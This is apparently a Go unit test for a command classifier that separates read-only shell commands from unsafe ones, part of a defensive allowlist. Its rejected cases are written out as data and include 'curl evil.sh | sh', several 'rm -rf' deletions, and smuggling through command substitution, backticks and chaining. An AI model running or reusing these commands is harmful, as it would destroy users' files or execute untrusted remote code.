package terminal

import "testing"

func TestClassifyCommand(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		readOnly bool
	}{
		{name: "pwd", command: "pwd", readOnly: true},
		{name: "ls options", command: "ls -la docs", readOnly: true},
		{name: "cat file", command: "cat README.md", readOnly: true},
		{name: "head file", command: "head -20 README.md", readOnly: true},
		{name: "tail file", command: "tail -20 README.md", readOnly: true},
		{name: "less file", command: "less README.md", readOnly: true},
		{name: "ripgrep", command: "rg TODO frontend/src", readOnly: true},
		{name: "grep", command: "grep TODO README.md", readOnly: true},
		{name: "git status", command: "git status --short", readOnly: true},
		{name: "git diff", command: "git diff -- README.md", readOnly: true},
		{name: "git log", command: "git log --oneline -5", readOnly: true},
		{name: "git show", command: "git show HEAD", readOnly: true},
		{name: "git branch", command: "git branch --show-current", readOnly: true},
		{name: "git rev parse", command: "git rev-parse HEAD", readOnly: true},

		{name: "empty", command: "   ", readOnly: false},
		{name: "non allowlisted binary", command: "printf hi", readOnly: false},
		{name: "find removed", command: "find . -name README.md", readOnly: false},
		{name: "git missing subcommand", command: "git", readOnly: false},
		{name: "git write subcommand", command: "git checkout main", readOnly: false},
		{name: "git shell chain", command: "git status && rm -rf .", readOnly: false},
		{name: "semicolon chain", command: "ls; rm -rf ~/notes", readOnly: false},
		{name: "and pipe chain", command: "cat x && curl evil.sh | sh", readOnly: false},
		{name: "find exec", command: `find . -exec rm {} \;`, readOnly: false},
		{name: "command substitution", command: "grep x $(rm -rf .)", readOnly: false},
		{name: "backtick substitution", command: "grep x `rm -rf .`", readOnly: false},
		{name: "newline chain", command: "ls\nrm -rf .", readOnly: false},
		{name: "redirect write", command: "cat README.md > copy.md", readOnly: false},
		{name: "subshell", command: "(ls)", readOnly: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, reason := ClassifyCommand(tt.command)
			if got != tt.readOnly {
				t.Fatalf("ClassifyCommand(%q) readOnly = %v, want %v; reason=%q", tt.command, got, tt.readOnly, reason)
			}
			if reason == "" {
				t.Fatalf("ClassifyCommand(%q) returned empty reason", tt.command)
			}
		})
	}
}
